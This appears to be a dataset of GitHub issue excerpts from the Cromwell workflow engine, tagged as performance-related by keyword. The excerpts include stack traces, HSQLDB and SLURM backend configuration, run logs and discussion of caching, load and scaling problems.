java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(Th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:2043,concurren,concurrent,2043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance," with aggregated hashes: initial = 58D108557F21E539CF9BE064A9528392, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:55,79] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.pcs:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,12] [warn] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-BackendCacheHitCopyingActor-9e4f5894:main.ethnicity_self_report:-1:1-20000000008 [9e4f5894main.ethnicity_self_report:NA:1]: Unrecognized runtime attribute keys: dx_t; imeout; [2022-12-15 21:27:56,12] [info] BT-322 9e4f5894:main.ethnicity_self_report:-1:1 cache hit copying success with aggregated hashes: initial = A32F403CF4C1AEE5AC6D327D9290D15E, file = EF056BD27B3A512F77663A400D778CCF.; [2022-12-15 21:27:56,12] [info] 9e4f5894-f7e6-4e2f-be4b-f547d6de7fff-EngineJobExecutionActor-main.ethnicity_self_report:NA:1 [9e4f5894]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.categorical_covariates' (scatter index: Some(0), attempt 1); [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.pcs' (scatter index: None, attempt 1); [2022-12-15 21:27:56,51] [info] WorkflowExecutionActor-9e4f5894-f7e6-4e2f-be4b-f547d6de7fff [9e4f5894]: Job results retrieved (CallCached): 'main.ethnicity_self_report' (scatter index: None, attempt 1); [2022-12-15 21:28:01,17] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Starting main.white_brits_sample_list, main.sex_aneuploidy_sample_list, main.low_genotyping_quality_sample_list, m; ain.sex_mismatch_sample_list, main.load_shared_covars; [2022-12-15 21:28:03,68] [info] Assigned new job execution tokens to the following groups: 9e4f5894: 5; [2022-12-15 21:28:03,69]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:32049,cache,cache,32049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance, |WORKFLOW_EXECUTION_UUID|METADATA_KEY|METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCachin,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:1383,Cache,Cache,1383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,2,['Cache'],['Cache']
Performance," }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; # Google project which will be billed for the requests; project = ""***-***"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }; }. default-runtime-attributes {; cpu: 2; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: false; preemptible: 0; zones: [""eu-west4-a"",""eu-west4-b"",""eu-west4-c""]; }. include ""papi_v2_reference_image_manifest.conf""; }; }; }; }; ```. Other info:; Debian GNU/Linux 10 (buster); openjdk version ""11.0.9.1-internal"" 2020-11-04 (through MiniConda, also tried with openjdk version ""11.0.12"" 2021-07-20, no difference to failure message). Permissions for service-account (quite liberal); ![image](https://user-images.githubusercontent.com/36060453/129350599-b68eee59-f08b-458f-b164-c48210b140de.png)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:15326,cache,cache,15326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['cache'],['cache']
Performance,"![image](https://user-images.githubusercontent.com/165320/46151480-da3c2080-c23c-11e8-97a4-ecfa39139c11.png). We're seeing intermittent connectivity issues w/ message of ""socket timeout, cannot connect to server"" in Pingdom. They last 1-3 minutes and seem to be off and on:; ![image](https://user-images.githubusercontent.com/165320/46151547-05267480-c23d-11e8-865a-f9c1fc1c4e4d.png). From the looks of things this looks to be between pingdom and the load balancer or proxy, as neither Cromwell nor proxy logs are showing signs of distress during these times.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4164:451,load,load,451,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4164,1,['load'],['load']
Performance,"![load_avg_with_and_without_sync](https://cloud.githubusercontent.com/assets/817809/23653377/0b318f3e-0378-11e7-9b24-a2cbe2b3e2dd.png). This is a plot of load average on our machine that hosts cromwell running as server - the box has 48 cores and 256G RAM. Mounted filesystems are local disk, an NFS share, and Lustre filesystem that hosts cromwell executions directory. The chart covers two identical submissions of a batch of about 1500 workflows. The period on the left from 5:45 to 7:30 with load (gray area) peaking up around 800 is running with release 25 jar. The period on the right from 9:15 to 10:30 is running with a build that is identical to release 25 but without [this sync](https://github.com/broadinstitute/cromwell/blob/fac784dd4078b8cc12fb4ca6c9abdbb05072990b/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L192).; It's a big difference, and very noticeable in the responsiveness of the server at the two different times.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284691016:154,load,load,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-284691016,4,['load'],['load']
Performance,"""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env bash ${script}""; root = ""cromwell-executions""; filesystems {; local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hasing-strategy: [""path+modtime""]; }; }; }; }; }; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int threads = 1; String memory = ""2g""; String dx_timeout; """"""; submit = """"""; sbatch; --account <account>; --partition ind-shared; --nodes 1; --job-name=${job_name}-%j; # --output=logs/{job_name}/$j.out; 	 -o ${out} -e ${err} ; --mail-type FAIL --mail-user <email-address>; --ntasks-per-node=${threads}; --mem=${memory}; --time=${dx_timeout}; --parsable; --chdir ${cwd}; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }}; ```. Here's the log printed to the terminal. Notice the jump from [2022-12-15 21:15:03,84] to [2022-12-15 21:22:59,01]; ```; $ java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl; [2022-12-15 21:14:44,99] [info] Running with database db.url =; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:2305,concurren,concurrent-job-limit,2305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['concurren'],['concurrent-job-limit']
Performance,"""Fixed performance""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597918:7,perform,performance,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520597918,1,['perform'],['performance']
Performance,"""bjobs -w ${job_id} |& egrep -qvw 'not found|EXIT|JOBID'"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [; ""soft-link"", ""copy"", ""hard-link""; ]; hashing-strategy: ""path+modtime""; }; }; }; }; }; }; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; metadata {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-metadata-db/;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3;; hsqldb.log_size=0; """"""; connectionTimeout = 86400000; numThreads = 2; }; insert-batch-size = 2000; read-batch-size = 5000000; write-batch-size = 5000000; }; }. services {; MetadataService {; metadata-read-row-number-safety-threshold = 5000000; }; }; ```; The main issue that I can see is that Cromwell is ignoring the increased metadata row count. this is despite my separating out the metadata database and increasing the thresholds on both databases. Prior to running the changes listed above I have ensured that the working directory is completely purged of logs and metadata so as to ensure an unobstructed run. The documentation currently provides no additional guidance on how to overcome the error. Any assistance will be appreciated.; Best wishes,. Matthieu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7203:3266,cache,cached,3266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7203,1,['cache'],['cached']
Performance,"""isWGS"": false,; ""ref_fasta_dict"": ""/data/ref/Homo_sapiens_assembly19.dict"",; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""jobId"": ""28189"",; ""backend"": ""Local"",; ""stderr"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-13/execution/stderr"",; ""callRoot"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-13"",; ""attempt"": 1,; ""start"": ""2016-09-23T13:53:25.035Z""; },; {; ""Call caching read result"": ""Cache Miss"",; ""retryableFailure"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-TumorCalculateTargetCoverage/shard-14/execution/stdout"",; ""shardIndex"": 14,; ""runtimeAttributes"": {; ""docker"": ""broadinstitute/gatk-protected:24e6bdc0c058eaa9abe63e1987418d0c144fef8e"",; ""failOnStderr"": false,; ""continueOnReturnCode"": ""0""; },; ""cache"": {; ""allowResultReuse"": true; },; ""Effective call caching mode"": ""ReadAndWriteCache"",; ""inputs"": {; ""input_bam"": ""/data/private/SM-74P4H.bam"",; ""ref_fasta"": ""/data/ref/Homo_sapiens_assembly19.fasta"",; ""keep_duplicate_reads"": true,; ""grouping"": ""SAMPLE"",; ""disable_all_read_filters"": false,; ""ref_fasta_fai"": ""/data/ref/Homo_sapiens_assembly19.fasta.fai"",; ""bam_idx"": ""/data/private/SM-74P4H.bai"",; ""entity_id"": ""SM-74P4H"",; ""disable_sequence_dictionary_validation"": true,; ""mem"": 2,; ""gatk_jar"": ""/root/gatk-protected.jar"",; ""transform"": ""PCOV"",; ""isWGS"": false,; ""ref_fasta_dict"": ""/data/ref/Homo_sapiens_assembly19.dict"",; ""padded_target_file"": ""/home/lichtens/test_eval/cromwell-executions/case_gatk_acnv_workflow/ecf3a99c-634e-42d6-9e25-1ebba542098c/call-PadTargets/execution/targets.padded.tsv""; },; ""returnCode"": -1,; """,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:67381,Cache,Cache,67381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"""main"" #1 prio=5 os_prio=31 tid=0x00007fb76a803000 nid=0xf07 waiting on condition [0x000000010b088000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c061d308> (a scala.concurrent.impl.Promise$CompletionLatch); at java.util.concurrent.locks.LockSupport.park(Redefined); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedInterruptibly(AbstractQueuedSynchronizer.java:997); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireSharedInterruptibly(AbstractQueuedSynchronizer.java:1304); at scala.concurrent.impl.Promise$DefaultPromise.tryAwait(Promise.scala:199); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.impl.Promise$DefaultPromise.ready(Promise.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.Await$$anonfun$ready$1.apply(package.scala); at scala.concurrent.BlockContext$DefaultBlockContext$.blockOn(BlockContext.scala); at scala.concurrent.Await$.ready(package.scala:169); at cromwell.Main.cromwell$Main$$waitAndExit(Main.scala); at cromwell.Main$$anonfun$runServer$2.apply$mcI$sp(Main.scala:109); at cromwell.Main.continueIf(Main.scala); at cromwell.Main.runServer(Main.scala:109); at cromwell.Main.runAction(Main.scala:103); at cromwell.Main$.delayedEndpoint$cromwell$Main$1(Main.scala:49); at cromwell.Main$delayedInit$body.apply(Main.scala); at scala.Function0$class.apply$mcV$sp(Function0.scala); at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.App$$anonfun$main$1.apply(App.scala); at scala.collection.immutable.List.foreach(List.scala:380); at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala); at scala.App$class.main(App.scala:76); at cromwell.Main$.main(Mai",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:51210,concurren,concurrent,51210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['concurren'],['concurrent']
Performance,"# See https://cromwell.readthedocs.io/en/stable/Configuring/; # only use double quotes!; include required(classpath(""application"")). system {; abort-jobs-on-terminate = true; io {; number-of-requests = 30; per = 1 second; }; }. ## file based persistent database; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env bash ${script}""; root = ""cromwell-executions""; filesystems {; local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hasing-strategy: [""path+modtime""]; }; }; }; }; }; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int threads = 1; String memory = ""2g""; String dx_timeout; """"""; submit = """"""; sbatch; --account <account>; --partition ind-shared; --nodes 1; --job-name=${job_name}-%j; # --output=logs/{job_name}/$j.out; 	 -o ${out} -e ${err} ; --mail-type FAIL --mail-user <email-address>; --ntasks-per-node=${threads}; --mem=${memory}; --time=${dx_timeout}; --parsable; --chdir ${cwd}; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }}; ```. Here's the log printed to the terminal. Notice the jump from [2022-12-15 21:15:03,84] to [2022-12-15 21:22:59,01]; ```; $ java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:1925,concurren,concurrent-job-limit,1925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['concurren'],['concurrent-job-limit']
Performance,"# Thursday. 1. Jobs ""queued in cromwell""; 2. Doug started job, 8 hours to start; 3. Graphite under-reporting. # Friday. 1. No improvement; 2. User1 suggests his own wf running w/ 25k jobs; 3. disk quota hit; 4. **No limit on # jobs running / project**; 4. Console quotas page revealed this; 5. User1 aborts wf; 6. 10 minutes of improvement, then back down to low throughput; 7. **Difficult to understand who is running what**; 8. We found a crude query to ask ^; 9. Bubbled up sub-wf's manually; 10. Found User2 running a large job; 11. User had upped quotas on # cpus, persistent disk and IP's; 12. **Exhausted IP quota, PAPI throttles itself as a result of too many API calls**",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3666:21,queue,queued,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3666,3,"['queue', 'throttle', 'throughput']","['queued', 'throttles', 'throughput']"
Performance,"# What happened:. On 8/25/18, Dockerhub performed some scheduled maintenance. Cromwell subsequently failed to start new jobs as PAPI reported 500 errors from Dockerhub. # What should have happened:. Cromwell should be resilient to outages in its dependencies, in this case docker hosts. It should *not* report as down, but instead should be in a ""degraded"" state where jobs may be submitted/finished/etc. but new jobs will not be started until the docker host is back to full health. This should be a nuanced status check. GCR images may still be pulled when Dockerhub is down, so those jobs should proceed as planned.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4056:40,perform,performed,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4056,1,['perform'],['performed']
Performance,"# What happens. When a large workflow is queried for metadata, cromwell spends a considerable amount of time preparing the repsonse. **This usually results in a timeout for the caller.** In some cases, the preparation is so expensive that Cromwell either runs out of memory or enters a zombie-like state(#4105). # What should happen. The caller should receive a timely response, and Cromwell should not be endangered by operations on large workflows. # Speculation: Construction of result. The result is constructed in a two-phase manner: gather all the data, then produce a structured response. This is done for two reasons:. 1. Unstructured metadata is difficult for a human to understand.; 1. There are possibly many duplicates due to the way restarts are handled. ## Recommendation. ~Stream results (using doobie SQL library?) and construct response while gathering data. This should mean that a large pool of data is never present in memory, only the current result set and the partial response.~. Not streaming for now. Instead going to [`foldMap`](https://typelevel.org/cats/typeclasses/foldable.html) large sequence into `Map` monoid, then combine all those maps together into a final result. . There is some manipulation to be done after combining a result. 1. Sort calls by time; 1. Prune duplicates by taking the most recent. [This has some special cases](https://github.com/broadinstitute/cromwell/blob/3d68421b025db26ac3ab53972f69497e90601a47/engine/src/main/scala/cromwell/webservice/metadata/MetadataComponent.scala#L93) that need to be considered. # Speculation: Database table. The metadata table is currently an unindexed monster, comprising 10^6 - 10^9 rows and between 2-3 TB of data. The query has historically been surprisingly performant but is likely going to degrade over time. ## Recommendation . **punt on DB changes**. Believe to be related to #4093 and #4105",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124:1750,perform,performant,1750,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124,1,['perform'],['performant']
Performance,"# What we have today. All runnable jobs are ""submitted"" (started but do not automatically run). We then apply backpressure using a token system on runnable jobs. Jobs which are runnable but not given a token reside in memory. # What we want. We do not pull any new jobs to be run unless all of the following conditions are met:. * The number of running jobs is below a threshold; * Dockerhub is healthy; * PAPI is healthy; * Database is healthy; * GCR is healthy!; * [insert other dependent systems here please]. # What this will give us. * A more powerful pull-based architecture (no need for backpressure gymnastics); * More resiliency to failures of dependent systems; * Less memory pressure. # What the author of this issue does not yet know / needs investigation. * Whether new runnable jobs from a new workflow are started(""submitted"" might be better word) automatically or persisted to the DB before they are run. This issue generally assumes this algorithm applies at the time of retrieving runnable jobs from the DB. # Technical miscellanies. * [fs2 Signal](https://github.com/functional-streams-for-scala/fs2/blob/072776fc8ba5ec41c9e8cdd0c28b6e719375112a/core/shared/src/main/scala/fs2/concurrent/Signal.scala) Is useful to share mutable state between threads, in this case the health status of our dependent services.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4138:1196,concurren,concurrent,1196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4138,1,['concurren'],['concurrent']
Performance,"# Why; To improve copy fail performance because it introduced I/O bottlenecks -- specifically to improve the workshop experience; # What; Confirm that the existing test is either the right one, or replace it with the right test case of a theoretical ; # Measure. * \# of results from Call cache requests; * Total time it takes to get through results & return answer; * How many elements per bucket it is looking at before blacklisting; * How long does each bucket take?. # Assert; * Still returns call cache hit -or-; * Runs the job",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4791:28,perform,performance,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4791,4,"['bottleneck', 'cache', 'perform']","['bottlenecks', 'cache', 'performance']"
Performance,"# gnomad, gnomad_idx: optional database of known germline variants (and its index) (see http://gnomad.broadinstitute.org/downloads); ## variants_for_contamination, variants_for_contamination_idx: VCF of common variants (and its index)with allele frequencies for calculating contamination; ##; ## ** Secondary resources ** (for optional tasks); ## realignment_index_bundle: resource for FilterAlignmentArtifacts, which runs if and only if it is specified. Generated by BwaMemIndexImageCreator.; ##; ## Funcotator parameters (see Funcotator help for more details).; ## funco_reference_version: ""hg19"" for hg19 or b37. ""hg38"" for hg38. Default: ""hg19""; ## funco_output_format: ""MAF"" to produce a MAF file, ""VCF"" to procude a VCF file. Default: ""MAF""; ## funco_compress: (Only valid if funco_output_format == ""VCF"" ) If true, will compress the output of Funcotator. If false, produces an uncompressed output file. Default: false; ## funco_use_gnomad_AF: If true, will include gnomAD allele frequency annotations in output by connecting to the internet to query gnomAD (this impacts performance). If false, will not annotate with gnomAD. Default: false; ## funco_transcript_selection_mode: How to select transcripts in Funcotator. ALL, CANONICAL, or BEST_EFFECT; ## funco_transcript_selection_list: Transcripts (one GENCODE ID per line) to give priority during selection process.; ## funco_data_sources_tar_gz: Funcotator datasources tar gz file. Bucket location is recommended when running on the cloud.; ## funco_annotation_defaults: Default values for annotations, when values are unspecified. Specified as <ANNOTATION>:<VALUE>. For example: ""Center:Broad""; ## funco_annotation_overrides: Values for annotations, even when values are unspecified. Specified as <ANNOTATION>:<VALUE>. For example: ""Center:Broad""; ## funcotator_excluded_fields: Annotations that should not appear in the output (VCF or MAF). Specified as <ANNOTATION>. For example: ""ClinVar_ALLELEID""; ## funco_filter_funcotations: If true",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5345:4540,perform,performance,4540,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5345,1,['perform'],['performance']
Performance,"## Add cached-copy localization strategy. ### The problem. Containers are great, but soft-links cannot be used. Hard-links in the execution folder are fine, but these cannot be used across physical disks. Most HPC have a filesystem consisting of multiple disks. This means only `copy` can be used as a localization strategy. Say you want to align multiple samples to the reference genome. And the reference genome is on another physical disk. That means the reference genome is copied once for each sample. That takes a lot of IO time and a lot of physical disk space. This makes cromwell practically unusable for use with containers on a HPC. Multiple people have the same problem and proposed a solution in #2620, #3447 and #4711. . ### This solution. This PR aims to tackle the problem by adding a new strategy called `cached-copy`. Since hard-links do not work across physical disks and soft-links do not work, copying is unavoidable. However, instead of copying the file directly into `<call_dir>/inputs` the file is first copied to a cache in `<cromwell_root>/cached-inputs`. This should ensure that `cached-inputs` is on the same physical disk as `<call_dir>` (which is also in `<cromwell_root>`). The cached file is then hard-linked to `<call_dir>/inputs`. When the same file is needed again it will check if the file already exists in the `cached-inputs` and then hard-link it. This saves all the time needed for copying. ### Technical notes; File collisions are prevented by appending the last modified time epoch millisecond to the name of the cached file. If the input file is changed between jobs it will create a new cache entry. Md5sums are not used because it is extremely compute intensive for large files. Path+modtime should guarantee that files are the same. . I have expanded the SFS test scala file so it properly tests the new `cached-inputs` strategy. I have added information on how to use the strategy in the docs, and added this PR to the changelog. ### Help still needed. T",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900:7,cache,cached-copy,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900,2,['cache'],['cached-copy']
Performance,"## Why; Emerald empire scattered 100k wide and it didn’t go well. * Cromwell pegged CPU and was unresponsive to HTTP calls, forcing the process manager to kill it; * Papi v2 deadlocked w/ load (talked to Aaron Kemp & Henry Ferrara, No-op for us. ## What; Send 100k wide scatter to Cromwell, make sure it handles it gracefully. ## Measure. * Time it took to complete scatter (TODO: not sure at which point to consider ""complete"", almost certainly it should be before the WDL is run and thus avoids the inherent variance of the backend ); * CPU (should not be pegged); * HTTP Responsiveness (should respond to HTTP calls in a reasonable time: < 2s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4795:188,load,load,188,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4795,1,['load'],['load']
Performance,"### Description. - Ignoring this index results in empirically better performance; - If we were going to design an index from scratch for this table, it would not be this one. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [x] I updated `CHANGELOG.md` in this PR; - [ ] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7452:69,perform,performance,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7452,1,['perform'],['performance']
